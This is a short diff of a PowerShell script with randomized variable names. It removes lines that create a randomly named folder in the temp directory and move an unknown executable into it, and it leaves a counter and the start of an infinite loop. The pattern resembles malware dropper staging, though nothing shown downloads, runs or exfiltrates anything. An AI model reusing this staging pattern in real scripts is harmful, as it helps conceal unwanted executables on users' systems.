@@ -1,7 +1,3 @@
-$HpsTugQnfJ = "$env:temp/bNOEXCxyVp"
-mkdir $HpsTugQnfJ
-Set-Location $HpsTugQnfJ
-Move-Item -Path $env:temp/UaAIVKpYhR.exe -Destination $HpsTugQnfJ
 $xNaqfyEYmt = 0
 
 while ($true) {
